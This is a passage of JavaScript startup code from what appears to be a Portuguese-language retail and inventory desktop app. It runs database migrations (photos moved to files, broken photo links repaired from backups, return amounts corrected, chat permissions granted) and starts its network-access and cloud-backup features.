  // Migração v3.25.22: fotos base64 do banco → arquivos em dados/fotos.
  // Motivo: fotos inline inflavam o .db e o export() de cada gravação estourava
  // a memória do SQLite/WASM (Aborted OOM) ao ajustar estoque no Windows.
  // Segurança: backup do .db ANTES (cópia de arquivo, sem export); e o base64 só
  // sai da linha DEPOIS que o arquivo foi gravado. Idempotente (flag em config).
  try {
    const flag = 'migr_fotos_disco_v1';
    const jaFeita = db.prepare("SELECT valor FROM config WHERE chave=?").get(flag);
    // só migra se houver realmente foto inline (evita trabalho em banco já migrado)
    const temInline = !jaFeita && db.prepare(
      "SELECT 1 FROM produtos WHERE foto LIKE 'data:image/%' " +
      "UNION ALL SELECT 1 FROM variacoes WHERE foto LIKE 'data:image/%' LIMIT 1"
    ).get();
    if (temInline) {
      // 1) Backup do banco atual por CÓPIA DE ARQUIVO (não usa export → não estoura)
      try {
        const dir = await ambiente.dirDados();
        const src = `${dir}/salgueiro.db`;
        const st = await Neutralino.filesystem.getStats(src).catch(() => null);
        if (st) {
          const bkpDir = `${dir}/backups`;
          try { await Neutralino.filesystem.createDirectory(bkpDir); } catch {}
          await Neutralino.filesystem.copy(src, `${bkpDir}/salgueiro-antes-fotos.db`);
        }
      } catch (e) { console.warn('[migr-fotos] backup:', e && e.message); }

      // 2) Extrair cada foto inline para arquivo e trocar a coluna pelo nome
      let migradas = 0, falhas = 0;
      for (const tabela of ['produtos', 'variacoes']) {
        const linhas = db.prepare(
          `SELECT id, foto FROM ${tabela} WHERE foto LIKE 'data:image/%'`
        ).all();
        for (const l of linhas) {
          try {
            const nome = await ambiente.salvarFotoArquivo(l.foto);
            if (nome) {
              db.prepare(`UPDATE ${tabela} SET foto=? WHERE id=?`).runVolatil(nome, l.id); // sem db.export() → sem OOM
              migradas++;
            } else { falhas++; }
          } catch (e) { falhas++; console.warn('[migr-fotos]', tabela, l.id, e && e.message); }
        }
      }
      // 3) VACUUM: sem as fotos, as páginas do banco ficaram livres mas o arquivo
      //    continua do mesmo tamanho (SQLite não devolve sozinho). O VACUUM
      //    reconstrói o banco compacto — só aqui o .db realmente encolhe e o
      //    export() de cada gravação para de estourar. É barato: os dados vivos
      //    já são pequenos (as fotos saíram).
      try { db.exec('VACUUM'); } catch (e) { console.warn('[migr-fotos] vacuum:', e && e.message); }
      // VACUUM compacta em memória; persiste agora para que o próximo boot já ache o banco menor
      try { await db.salvarAgora(); } catch (e) { console.warn('[migr-fotos] salvarAgora:', e && e.message); }

      // 4) Marca concluída só se nada falhou — senão repete no próximo boot,
      //    sem risco (as já migradas não têm mais 'data:image/%' e são puladas).
      if (falhas === 0) {
        db.prepare("INSERT OR REPLACE INTO config (chave, valor) VALUES (?, datetime('now','localtime'))").run(flag);
      }
      console.log(`[migr-fotos] ${migradas} foto(s) para disco, ${falhas} falha(s)`);
    } else if (!jaFeita) {
      // banco sem foto inline: marca como migrado para não checar toda vez
      db.prepare("INSERT OR REPLACE INTO config (chave, valor) VALUES (?, datetime('now','localtime'))").run(flag);
    }
  } catch (e) { console.error('[migr-fotos] falhou (banco intacto):', e && e.message); }

  // ── Reparo do vínculo foto ↔ produto (v3.25.32) ───────────────────────────
  //
  // O QUE ACONTECEU (26/08/2026): todas as fotos sumiram das telas de uma vez.
  // Os ARQUIVOS estavam intactos em dados/fotos; o que quebrou foi o VÍNCULO:
  // o banco apontava para 42 nomes de arquivo inexistentes enquanto 44 arquivos
  // ficavam órfãos na pasta.
  //
  // CAUSA: a foto vira um arquivo com nome ALEATÓRIO na migração. Restaurar um
  // backup do banco (ou trazer o banco de outra máquina) traz os nomes daquela
  // outra "leva" — mas os ARQUIVOS não vêm junto com o .db. Resultado: todos os
  // ponteiros quebram de uma vez e o app mostra tudo sem foto, em silêncio,
  // porque lerFotoArquivo devolve null quando o arquivo não existe.
  //
  // O REPARO: se houver foto apontando para arquivo que não existe, procura nos
  // backups (mais novo primeiro) um mapa id→arquivo cujo arquivo EXISTA em
  // disco e refaz o vínculo. Só religa o que dá para provar; nunca inventa.
  try {
    const arquivos = new Set(await ambiente.listarArquivosFotos());
    if (arquivos.size) {
      const quebrados = { produtos: [], variacoes: [] };
      for (const tabela of ['produtos', 'variacoes']) {
        const linhas = db.prepare(
          `SELECT id, foto FROM ${tabela} WHERE foto IS NOT NULL AND foto <> '' AND foto NOT LIKE 'data:image/%'`
        ).all();
        for (const l of linhas) if (!arquivos.has(l.foto)) quebrados[tabela].push(l.id);
      }
      const totalQuebrado = quebrados.produtos.length + quebrados.variacoes.length;
      if (totalQuebrado > 0) {
        console.warn(`[reparo-fotos] ${totalQuebrado} vínculo(s) quebrado(s) — procurando nos backups`);
        const { backups } = await ambiente.listarBackupsLocais(); // mais novo primeiro
        let religadas = 0;
        for (const b of backups) {
          if (!quebrados.produtos.length && !quebrados.variacoes.length) break;
          let t = null;
          try {
            const bytes = await ambiente.lerBackupLocal(b.nome);
            if (!bytes || !bytes.length) continue;
            if (bytes.length > 8_000_000) continue; // backup grande: 2ª instância sql.js em memória → OOM
            t = await abrirDeBytes(bytes, async () => {});
            for (const tabela of ['produtos', 'variacoes']) {
              if (!quebrados[tabela].length) continue;
              const restantes = [];
              for (const id of quebrados[tabela]) {
                let cand = null;
                try { cand = t.prepare(`SELECT foto FROM ${tabela} WHERE id=?`).get(id); } catch {}
                const nome = cand && cand.foto;
                if (nome && arquivos.has(nome)) {
                  db.prepare(`UPDATE ${tabela} SET foto=? WHERE id=?`).runVolatil(nome, id); // sem db.export() → sem OOM
                  religadas++;
                } else { restantes.push(id); }
              }
              quebrados[tabela] = restantes;
            }
          } catch (e) { console.warn('[reparo-fotos] backup', b.nome, e && e.message);
          } finally { try { if (t) t._db.close(); } catch {} }
        }
        const sobraram = quebrados.produtos.length + quebrados.variacoes.length;
        if (religadas > 0) {
          try { await db.salvarAgora(); } catch {}
          console.log(`[reparo-fotos] ${religadas} foto(s) religada(s), ${sobraram} sem correspondência`);
        } else {
          console.warn(`[reparo-fotos] nenhum backup tinha o vínculo (${sobraram} pendente(s))`);
        }
      }
    }
  } catch (e) { console.error('[reparo-fotos] falhou (banco intacto):', e && e.message); }

  // Migration v2.0.48: recalcular valor_devolvido em devoluções de vendas com desconto geral.
  // O bug pré-v2.0.48 usava o total bruto do item (sem proporcionar desconto_geral da venda).
  try {
    const migrKey = 'migr_fix_dev_desconto_v2048';
    if (!db.prepare("SELECT valor FROM config WHERE chave=?").get(migrKey)) {
      const devsComDesconto = db.prepare(`
        SELECT d.id, d.venda_id, CAST(v.total AS REAL) vtotal, CAST(v.subtotal AS REAL) vsubtotal
        FROM devolucoes d
        JOIN vendas v ON v.id = d.venda_id
        WHERE v.desconto > 0 AND v.subtotal > 0
      `).all();
      const arredM = n => Math.round((Number(n) || 0) * 100) / 100;
      for (const dev of devsComDesconto) {
        const fator = dev.vtotal / dev.vsubtotal;
        const itens = db.prepare(`
          SELECT di.id, di.qtd,
                 CAST(vi.total AS REAL) item_total,
                 CAST(vi.qtd AS REAL) item_qtd_orig
          FROM devolucao_itens di
          JOIN venda_itens vi ON vi.venda_id=? AND vi.variacao_id=di.variacao_id
          WHERE di.devolucao_id=?
        `).all(dev.venda_id, dev.id);
        let novoTotal = 0;
        for (const it of itens) {
          const vu = arredM((it.item_total / it.item_qtd_orig) * fator);
          const tt = arredM(it.qtd * vu);
          db.prepare('UPDATE devolucao_itens SET valor_unit=?, total=? WHERE id=?').run(vu, tt, it.id);
          novoTotal += tt;
        }
        novoTotal = arredM(novoTotal);
        db.prepare('UPDATE devolucoes SET valor_devolvido=? WHERE id=?').run(novoTotal, dev.id);
        console.log(`[migr] dev#${dev.id} corrigida: fator=${fator.toFixed(4)} novo=${novoTotal}`);
      }
      db.prepare("INSERT OR REPLACE INTO config (chave, valor) VALUES (?,?)").run(migrKey, '1');
      console.log('[migr] fix_dev_desconto_v2048 ok');
    }
  } catch (e) { console.warn('[migr] fix_dev_desconto_v2048:', e); }

  // Migration v3.1.0: libera o chat interno para quem já existia.
  // Usuários com permissões personalizadas (JSON gravado) não teriam a chave
  // nova e ficariam sem o balão de mensagens até alguém reeditar cada um.
  try {
    const migrKey = 'migr_mensagens_v310';
    if (!db.prepare('SELECT valor FROM config WHERE chave=?').get(migrKey)) {
      const usuarios = db.prepare(
        "SELECT id, permissoes FROM usuarios WHERE perfil <> 'admin' AND permissoes IS NOT NULL AND permissoes <> ''"
      ).all();
      let n = 0;
      for (const u of usuarios) {
        let lista;
        try { lista = JSON.parse(u.permissoes); } catch { continue; }
        if (!Array.isArray(lista) || lista.includes('mensagens.usar')) continue;
        lista.push('mensagens.usar');
        db.prepare('UPDATE usuarios SET permissoes=? WHERE id=?').run(JSON.stringify(lista), u.id);
        n++;
      }
      db.prepare('INSERT OR REPLACE INTO config (chave, valor) VALUES (?,?)').run(migrKey, '1');
      console.log(`[migr] mensagens_v310 ok (${n} usuário(s) liberados no chat)`);
    }
  } catch (e) { console.warn('[migr] mensagens_v310:', e); }

  // Acesso em rede: prepara a ponte com a extensão e religa se estava ativa
  try {
    rede.preparar(processar);
    const cfgIni = config.obter(db).config;
    if (cfgIni.rede_ativa === '1' && licenca.moduloAtivo('rede')) {
      setTimeout(() => rede.iniciar({ porta: Number(cfgIni.rede_porta) || 8750 })
        .then(r => { if (!r.ok) console.error('[rede]', r.erro); }), 1200);
    }
  } catch (e) { console.error('[rede] preparo falhou:', e); }

  // Backup na nuvem: registra ouvinte OAuth e agenda verificação diária
  try {
    nuvem.registrarOAuthListener();
    // Verifica 5s após o boot e depois a cada hora
    const _checkBackup = async () => {
      try { if (await nuvem.precisaBackupDiario()) await nuvem.fazerBackupTodos(db); }
      catch { /* silencioso — sem internet ou não configurado */ }
    };
    setTimeout(_checkBackup, 5000);
    setInterval(_checkBackup, 3600000);
  } catch (e) { console.error('[nuvem] preparo falhou:', e); }

  // Garante que nenhuma escrita pendente se perca ao fechar o sistema
  // (o index.html chama este gancho quando o usuário clica no X)
  window.__fecharComSalvamento = async () => {
    try { await db.salvarAgora(); } catch (_) {}
    await ambiente.sairApp();
  };
}

export function pronto() {
  if (!_pronto) _pronto = _iniciar();
  return _pronto;
}

// A função que o frontend usa: mesma assinatura da V1.
export async function api(canal, payload) {
  await pronto();
  const r = await processar(canal, payload, sessao);
  // Gerencia sessao APENAS para o app local (terminais em rede usam sessoes Map em rede.js)
  if (canal === 'auth:login'  && r && r.ok) sessao.usuario = r.usuario;
  if (canal === 'auth:logout') sessao.usuario = null;
  return r;
}
